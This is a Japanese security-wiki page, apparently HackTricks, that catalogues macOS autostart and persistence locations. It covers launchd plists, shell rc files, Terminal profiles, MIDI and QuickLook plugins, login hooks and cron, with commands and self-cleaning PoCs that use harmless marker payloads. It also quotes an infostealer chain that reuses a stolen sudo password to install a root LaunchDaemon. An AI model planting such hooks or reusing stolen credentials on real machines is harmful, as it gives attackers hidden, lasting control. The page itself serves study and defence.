# macOS 自動起動

{{#include ../banners/hacktricks-training.md}}

このセクションは、ブログシリーズ [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) を大いに参考にしています。ファイルへの書き込みが後のコード実行につながる場所、その実行を引き起こすイベント、および必要な権限を特定することを目的としています。ある場所が存在するからといって、その仕組みが有効であるとは限りません。以下のローカル確認は macOS 26.5.2（2026年10月5日）で実施したものであり、すべての macOS バージョンでの動作を示すものではありません。

> [!NOTE]
> 「書き込みがトリガーになる」といっても、必ずしも「書き込み直後に実行される」わけではありません。ログイン時、特定のアプリケーションの起動時、またはユーザーが何らかの操作をしたときにのみ読み込まれる場所もあります。すでに設定済みのジョブ内にある書き込み可能な payload と、新しいジョブを登録する権限も別物です。手法を頼りにする前に、使い捨てアカウントまたは VM でテストしてください。

## Sandbox Bypass

> [!TIP]
> ここでは、ファイルに何かを書き込み、よくある操作を待つか、一定時間待つか、root 権限なしで通常 sandbox 内から実行できる操作を行うだけでコードを実行できる、**sandbox bypass** に役立つ自動起動場所を紹介します。

### Launchd

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/Library/LaunchAgents`**
  - **トリガー**: ユーザーログイン（または明示的な登録）
  - root 権限が必要
- **`/Library/LaunchDaemons`**
  - **トリガー**: システム起動時（または明示的な登録）
  - root 権限が必要
- **`/System/Library/LaunchAgents`**
  - **トリガー**: ユーザーログイン時。Apple の保護対象システム領域
- **`/System/Library/LaunchDaemons`**
  - **トリガー**: システム起動時。Apple の保護対象システム領域
- **`~/Library/LaunchAgents`**
  - **トリガー**: 再ログイン

`launchd` がスキャンする `~/Library/LaunchDaemons` という場所はありません。ユーザーごとのジョブは `~/Library/LaunchAgents` に置き、システムデーモンは `/Library/LaunchDaemons` に置きます。スキャン対象の場所については、[Apple の launchd 起動ガイド](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)に記載されています。

> [!TIP]
> 興味深いことに、**`launchd`** には Mach-o セクション `__Text.__config` 内に組み込みの property list があり、launchd が起動する必要のある、よく知られた他のサービスが含まれています。さらに、これらのサービスには `RequireSuccess`、`RequireRun`、`RebootOnSuccess` が含まれることがあり、これらはサービスを実行し、正常に完了させる必要があることを意味します。
>
> もちろん、code signing により変更できません。

#### 説明と Exploitation

**`launchd`** は、起動時に OX S カーネルによって実行される**最初の****プロセス**であり、シャットダウン時に最後に終了するプロセスです。常に **PID 1** である必要があります。このプロセスは、以下にある **ASEP** **plist** で指定された設定を**読み込み、実行**します。

- `/Library/LaunchAgents`: 管理者がインストールしたユーザーごとの agent
- `/Library/LaunchDaemons`: 管理者がインストールしたシステム全体の daemon
- `/System/Library/LaunchAgents`: Apple が提供するユーザーごとの agent
- `/System/Library/LaunchDaemons`: Apple が提供するシステム全体の daemon

ユーザーがログインすると、`launchd` はそのユーザーの `~/Library/LaunchAgents` にある plist を、そのユーザーの権限で読み込みます。ジョブは各種キーに従って起動されます。plist を読み込んだだけで、プロセスがただちに実行されるわけではありません。

**agent と daemon の主な違いは、agent はユーザーのログイン時に読み込まれ、daemon はシステム起動時に読み込まれることです**（ssh など、ユーザーがシステムにアクセスする前に実行する必要があるサービスがあるためです）。また、agent は GUI を使用できますが、daemon はバックグラウンドで実行する必要があります。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

各 `ProgramArguments` 要素は個別の引数です。`launchd` は単一の文字列をシェルコマンドとして解析しません。上記の修正版の例は、読み込まずに `plutil -lint /path/to/example.plist` で構文チェックできます。`ProgramArguments`、`RunAtLoad`、`KeepAlive` については、ローカルの `man launchd.plist` を参照してください。

#### 既存ジョブでのファイルイベントトリガー

**すでに読み込まれている** agent または daemon は、`WatchPaths` を使って指定したパスに変更があったときに起動できます。`QueueDirectories` はディレクトリが空でない間ジョブを起動し、`StartOnMount` はボリュームのマウント時に起動します。[Apple の launchd ガイド](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) には、`WatchPaths` と `QueueDirectories` の例があります。監視対象のファイルへの書き込みは、**すでに設定済みのジョブ**をトリガーします。書き込み側がジョブの実行ファイル、スクリプト、またはジョブが解釈するデータも制御できる場合に限り、任意のコード実行が可能になります。スキャン対象または登録済みの場所の外に新しい plist を書き込んだだけでは、読み込まれません。

この自己削除型 PoC は、一意の名前を持つ**一時的なユーザー agent**を登録し、自身の監視対象ファイルのみを変更してから agent を削除します。ログアウトや再起動を行わずに、macOS 26.5.2 で正常に実行できました。

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

ローカルで実行すると `watch fired: True` と表示され、`bootout` は成功しました。ここでは `launchctl bootstrap` を隔離された PoC 内でのみ使用しています。すでにロードされているジョブには必要ありません。既存のジョブを安全に評価するには、その plist と解決された `ProgramArguments` のパスを読み取り、変更を加えずに、該当する実行ファイルまたはインタープリターで処理されるファイルが書き込み可能か確認します。

**ユーザーがログインする前に実行する必要がある Agent** もあり、これらは **PreLoginAgents** と呼ばれます。たとえば、ログイン時に支援技術を利用できるようにする場合に役立ちます。これらは `/Library/LaunchAgents` にもあります（[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) に例があります）。

> [!TIP]
> 新しい Daemon または Agent の設定ファイルは、**次回の再起動後、または** `launchctl load <target.plist>` **を使ってロードされます**。拡張子のない .plist ファイルも `launchctl -F <file>` でロードできます（ただし、そのような plist ファイルは再起動後に自動的にロードされません）。\
> `launchctl unload <target.plist>` で **アンロード** することもできます（そのファイルが指定するプロセスは終了します）。
>
> Agent または Daemon の実行を妨げるもの（override など）が **何もない** ことを **確認する** には、次を実行します: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

現在のユーザーによってロードされたすべての Agent と Daemon を一覧表示します:

```bash
launchctl list
```

#### 悪意ある LaunchDaemon チェーンの例（パスワード再利用）

最近の macOS infostealer は、**窃取した sudo パスワード**を再利用して、ユーザーエージェントと root LaunchDaemon を配置しました:<sup>[[1]](#references)</sup>

- エージェントのループを `~/.agent` に書き込み、実行可能にします。
- そのエージェントを指す plist を `/tmp/starter` に生成します。
- 盗んだパスワードを `sudo -S` で再利用して、plist を `/Library/LaunchDaemons/com.finder.helper.plist` にコピーし、所有者を `root:wheel` に設定して、`launchctl load` で読み込みます。
- `nohup ~/.agent >/dev/null 2>&1 &` でエージェントをサイレントに起動し、出力を切り離します。

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> `/Library/LaunchDaemons` に置かれた daemon plist は、ユーザー所有にしても安全にはなりません。`launchd` はシステムジョブに適切な所有権と権限を要求し、安全でない plist を拒否する場合があります。root 所有の daemon は、通常、設定で別のアカウントが指定されていない限り root として実行されます。ジョブの `UserName`、`GroupName`、所有権、`launchctl` の診断情報を確認してください。plist の所有者名だけから実行ユーザーを判断してはいけません。

#### launchd に関する詳細

**`launchd`** は **kernel** から起動される **最初の** ユーザーモードプロセスです。プロセスの起動は **成功** しなければならず、**終了またはクラッシュしてはいけません**。一部の **kill シグナル** に対しても **保護** されています。

`launchd` が最初に行うことの1つは、次のような **daemon** をすべて **起動** することです。

- 実行時刻に基づく **Timer daemon**:
  - `com.apple.atrun.plist` は、macOS 26.5.2 で `StartInterval = 30` 秒として `/usr/libexec/atrun` を起動します。実際の有効状態は、launchd がオーバーライドを別途保持するため、plist の `Disabled` キーと異なる場合があります。
  - `/usr/lib/cron/tabs` にジョブがある場合、`com.vix.cron.plist` は `/usr/sbin/cron` を起動します。`com.apple.systemstats.daily` は別のスケジュールサービスであり、cron daemon ではありません。
- 次のような **Network daemon**:
  - `org.cups.cups-lpd`: TCP（`SockType: stream`）で待ち受けます（`SockServiceName: printer`）。
    - SockServiceName には、ポートまたは `/etc/services` に定義されたサービスを指定する必要があります。
  - `com.apple.xscertd.plist`: TCP のポート 1640 で待ち受けます。
- 指定したパスに変更があったときに実行される **Path daemon**:
  - `com.apple.postfix.master`: パス `/etc/postfix/aliases` を監視します。
- **IOKit notification daemon**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port**:
  - `com.apple.xscertd-helper.plist`: `MachServices` エントリに `com.apple.xscertd.helper` という名前が指定されています。
- **UserEventAgent**:
  - これは前述のものとは異なります。特定のイベントに応じて launchd にアプリを起動させます。ただし、この場合に関与するメインバイナリは `launchd` ではなく `/usr/libexec/UserEventAgent` です。SIP で制限されたフォルダ `/System/Library/UserEventPlugins/` からプラグインを読み込みます。各プラグインは `XPCEventModuleInitializer` キーに初期化子を指定します。古いプラグインの場合は、`Info.plist` の `CFPluginFactories` 辞書内にあるキー `FB86416D-6164-2070-726F-70735C216EC0` に指定します。

### shell startup file

解説: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
解説 (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - ただし、これらのファイルを読み込む shell を実行する TCC bypass を持つアプリを見つける必要があります。

#### 場所

- **`~/.zshenv`**（または、より新しいコンパイル済みファイル **`~/.zshenv.zwc`**）
  - **トリガー**: 非対話的な `zsh -c` を含む、通常の zsh の呼び出し。`zsh -f` はユーザーの startup file を読み込みません。
- **`~/.zshrc`**
  - **トリガー**: 対話型 zsh の起動。
- **`~/.zprofile`, `~/.zlogin`**
  - **トリガー**: login zsh の起動。これらはそれぞれ `.zshrc` の前後に読み込まれます。
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **トリガー**: zsh で terminal を開く。
  - root 権限が必要
- **`~/.zlogout`**
  - **トリガー**: login zsh が正常に終了したとき。すべての terminal や shell の終了時に実行されるわけではありません。
- **`/etc/zlogout`**
  - **トリガー**: zsh の terminal を終了する。
  - root 権限が必要
- さらに詳しくは **`man zsh`**
- **`~/.bashrc`**
  - **トリガー**: 対話型の **non-login** Bash を起動する。対話型 login Bash は、login file が明示的に読み込んだ場合に限り、このファイルを読み込みます。
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **トリガー**: login Bash の起動。この順番で最初に読み込み可能なファイルが実行されます。前の2つのいずれかが存在する場合、`~/.profile` は読み込まれません。
- **`/etc/profile`**
  - **トリガー**: login Bash の起動。変更には root 権限が必要です。
- **`~/.tcshrc`** または、存在しない場合は **`~/.cshrc`**
  - **トリガー**: この Mac では、非対話的な `tcsh -c` を含む `tcsh` の起動。ユーザーが実際に `tcsh` を呼び出す必要があります。これは macOS のデフォルト shell ではありません。
- **`~/.login`**
  - **トリガー**: login `tcsh` の起動時に、rc file の後で実行されます。
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **トリガー**: xterm で実行される想定ですが、xterm は **インストールされておらず**、インストールした後も次のエラーが発生します: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### 説明と Exploitation

`zsh` や `bash` のような shell 環境を開始すると、**特定の startup file が実行されます**。現在の macOS では `/bin/zsh` がデフォルト shell です。Terminal または SSH が login shell と interactive shell のどちらを起動するかは、それぞれの設定によります。すべてのセッションで上記のファイルがすべて実行されると想定してはいけません。macOS には `bash` と `sh` もありますが、使用するには明示的に起動する必要があります。<sup>[[2]](#references)</sup> [zsh startup-file reference](https://zsh.sourceforge.io/Doc/Release/Files.html) には、読み込み順序、`ZDOTDIR` による上書き、および `.zwc` のルールが記載されています。

以下は macOS 26.5.2 で、一時的な `ZDOTDIR` を使って行った読み取り専用の実験です。実際の shell startup file は変更せずに、読み込まれたユーザーファイルを示します。

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

観測された順序は次のとおりでした。`-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`。`ZDOTDIR` は代替ディレクトリを指している必要があります。任意のディレクトリにファイルを書くだけでは不十分です。

[Bashの起動時の動作に関するリファレンス](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)では、login shell と interactive shell が区別されています。macOS 26.5.2のテストマシンで、4つすべてのユーザー起動ファイルを含む分離された `HOME` を用意したところ、次の結果になりました。`bash -c` → なし、`bash -ic` → `.bashrc`、`bash -lc` と `bash -lic` → `.bash_profile` のみ。`.bash_profile` を削除すると、login Bash は `.bash_login` を読み込み、さらにそれも削除すると `.profile` を読み込みました。`BASH_ENV` を使うと、noninteractive Bash にファイルを指定できますが、この環境変数は呼び出し元のプロセスですでに設定されている必要があります。login Bash から明示的に `exit` すると、`~/.bash_logout` が読み込まれる場合もあります。

ローカルの `tcsh(1)` マニュアルには、独自の起動順序が記載されています。一時的な `HOME` を用意して `/bin/tcsh -c :` を実行すると、`.tcshrc` が読み込まれ、`.tcshrc` がない場合は `.cshrc` が読み込まれました。一時的な login `tcsh` では、`.tcshrc` と `.login` が読み込まれました。これらの確認では、一時ファイルのみを作成して削除しました。

### 再度開かれるアプリケーション

> [!CAUTION]
> 指定されたexploitを設定してログアウト・再ログインしても、あるいは再起動しても、テストではアプリが実行されませんでした。これらの操作を行う際に、アプリが実行中である必要がある可能性があります。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- sandboxの回避に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **トリガー**: 再起動時にアプリケーションを再度開く

#### 説明とexploit

再度開くアプリケーションはすべて、plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` の中にあります<sup>[[4]](#references)</sup>

そのため、再度開くアプリケーションとして自分のアプリを起動させるには、**自分のアプリをリストに追加**するだけです。

UUIDは、そのディレクトリを一覧表示するか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` で確認できます。

再度開かれるアプリケーションを確認するには、次のコマンドを実行します。

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

**このリストにアプリケーションを追加する**には、次を使用できます:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminalは、ユーザーが使用する際にFDA権限を持つようになります

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Trigger**: 起動コマンドが設定されたShell設定を含むプロファイルで、新しいTerminalウィンドウまたはタブを開く

#### Description & Exploitation

**`~/Library/Preferences`**には、アプリケーションに関するユーザーの環境設定が保存されています。これらの環境設定の一部には、**他のアプリケーションやスクリプトを実行する**設定が含まれることがあります。<sup>[[5]](#references)</sup>

たとえば、Terminalは起動時にコマンドを実行できます:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

この設定は、**`~/Library/Preferences/com.apple.Terminal.plist`**ファイルに次のように反映されます:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

関連するプロファイルに起動コマンドが含まれていて、Terminal がその設定を読み込む場合、そのプロファイルを使用する新しいセッションでコマンドを実行できます。[Apple の最新の Terminal ガイド](https://support.apple.com/guide/terminal/trmlshll/mac)には、プロファイルごとの **Shell → Startup** コマンドが記載されています。そのプロファイルを使用する新しいセッションを開始せずに Terminal を開くだけでは不十分です。以下の設定変更は、調査用 Mac では**実行されていません**。

これは CLI から追加できます：

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal を使うと、ユーザーの FDA permissions を利用できる

#### Location

- **Anywhere**
  - **Trigger**: 該当する `.terminal`、`.command`、または `.tool` ファイルを開く

#### Description & Exploitation

ユーザーが **`.terminal`** 設定ファイルを開くと、Terminal はそのプロファイルからセッションを作成できます。実行可能な **`.command`** および **`.tool`** ファイルも Terminal で開けます。これは明示的なファイルを開く操作が trigger であり、Terminal を開くだけで実行されるわけではありません。継承される TCC access は、Terminal に実際に付与されている権限と、試みる操作によって異なります。以下の過去の例は、調査用 Mac では実行していません。

次の方法で試してください:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

通常の shell script の内容である **`.command`**、**`.tool`** 拡張子も使用できます。これらも Terminal で開かれます。

> [!CAUTION]
> terminal に **Full Disk Access** がある場合、この操作を完了できます（実行されたコマンドは terminal ウィンドウに表示されることに注意してください）。

### オーディオプラグイン

解説: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
解説: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- sandbox のバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - 追加の TCC access を得られる可能性があります

#### 場所

- **`/Library/Audio/Plug-Ins/HAL`**
  - root が必要
  - **トリガー**: Core Audio server が互換性のある HAL device plug-in を読み込みます。server の再起動により再検出されることがあります
- **`/Library/Audio/Plug-ins/Components`**
  - root が必要
  - **トリガー**: audio host がインストール済みの Audio Unit を検出してインスタンス化します
- **`~/Library/Audio/Plug-ins/Components`**
  - **トリガー**: audio host がインストール済みの Audio Unit を検出してインスタンス化します
- **`/System/Library/Components`**
  - Apple 提供のシステム保護された場所
  - **トリガー**: audio host が一致するシステム component をインスタンス化します

#### 説明

以前の解説によると、**一部のオーディオプラグインをコンパイル**して読み込ませることが可能です。<sup>[[6]](#references)[[7]](#references)</sup>

HAL device plug-in と Audio Unit は、異なる読み込み経路を使用します。[Apple の Audio Unit hosting guide](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) によると、host は component を検出してインスタンス化する必要があります。スキャン対象ディレクトリにコピーしたり、`coreaudiod` を再起動したりするだけでは、実行されたことの証明にはなりません。AUv2 plug-in は host process 内で実行されますが、[Apple の最新の Audio Unit guidance](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) によると、macOS では AUv3 はデフォルトで別 process 内で実行されます。署名、sandbox、library validation の制約は host によって異なります。調査用 Mac では、オーディオプラグインのインストールや実行は行っていません。

### CoreMIDI Drivers (MIDIServer)

解説: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- sandbox のバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
  - コードはアプリの sandbox ではなく、`MIDIServer` process 内で実行されます
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` は独自の `seatbelt` sandbox profile で実行されます

#### 場所

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - root 不要（ユーザーが書き込み可能）
  - **トリガー**: `MIDIServer` の起動または再起動。CoreMIDI を初めて使用する process（*Audio MIDI Setup*、GarageBand、DAW、または WebMIDI を使用するページを開くなど）によって、オンデマンドで起動します
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - root が必要
  - **トリガー**: 上記と同じ

#### 説明と悪用

Apple の `MIDIServer`（`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`）は、`Audio/MIDI Drivers` ディレクトリから MIDI **driver** bundle を読み込みます。この binary は Apple 署名済みですが、`com.apple.security.cs.disable-library-validation` entitlement が付与されているため、**署名なし、または別の team による ad-hoc 署名済み**の bundle も読み込みます。その結果、root なしで Apple 所有の別 process 内でコードを実行できます。<sup>[[53]](#references)</sup>

macOS 26 で読み取り専用で検証済み:

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

ドライバは `MIDIDriverInterface` factory をエクスポートする標準バンドルです。factory/constructor に payload を配置すると、`MIDIServer` がドライバを列挙した時点で実行されます。ビルドして `~/Library/Audio/MIDI Drivers/Evil.plugin` として配置し、ログアウトや再起動なしでロードをトリガーします:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - 追加のTCCアクセスを得られる可能性があります

#### 場所

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 説明と悪用

QuickLookプラグインは、**ファイルのプレビューを表示するとき**（Finderでファイルを選択してスペースバーを押す）、そのファイル形式に対応する**プラグイン**がインストールされていれば実行されます。<sup>[[8]](#references)</sup>

独自のQuickLookプラグインをコンパイルして、前述の場所のいずれかに配置すれば読み込ませることができます。その後、対応するファイルを開いてスペースキーを押すと実行されます。

これらのパスは、従来の`.qlgenerator`バンドルを指しています。[AppleのQuick Lookアーキテクチャガイド](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html)には、検索順序と対応するファイル形式が記載されています。現在のQuick Look **app extensions**はアプリにパッケージ化され、登録方法と実行ルールが異なります。ジェネレーターが存在していても、そのジェネレーターがファイル形式の選択で優先されることや、そのコードがFinder自体で実行されることを意味するわけではありません。従来のジェネレーターパスは、ドキュメントとディレクトリの存在を確認しましたが、調査用Macにはジェネレーターをインストールしておらず、読み込みもしていません。

### ~~Login/Logout Hooks~~

> [!CAUTION]
> ユーザーのLoginHookでもrootのLogoutHookでも、私の環境では動作しませんでした。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`のようなコマンドを実行できる必要があります
  - `~/Library/Preferences/com.apple.loginwindow.plist`に格納されています

これらは非推奨ですが、ユーザーのログイン時にコマンドを実行するために使用できます。<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

この設定は `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` に保存されています。

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

削除するには:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

root user のものは **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** に保存されています

## Conditional Sandbox Bypass

> [!TIP]
> ここでは、**sandbox bypass** に役立つ起動場所を紹介します。これは、ファイルに何かを書き込み、特定の**プログラムがインストールされている**、ユーザーが「一般的でない」操作を行う、または特定の環境であるといった、あまり一般的ではない条件を想定するだけで実行できるものです。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、`crontab` バイナリを実行できる必要があります
  - または root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`**
  - 直接書き込むには root が必要です。`crontab <file>` を実行できる場合は root は不要です
  - **Trigger**: インストールされた crontab のスケジュールです。`at` と `periodic` は以下で説明する別の仕組みです。

#### Description & Exploitation

**現在のユーザー**の cron ジョブを一覧表示するには:

```bash
crontab -l
```

システムの cron デーモンの launchd plist には、`/usr/lib/cron/tabs` を指定する `QueueDirectories` エントリがあります。インストール済みのユーザー crontab はここに保存されています。他のユーザーの crontab を調べるには root 権限が必要です:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

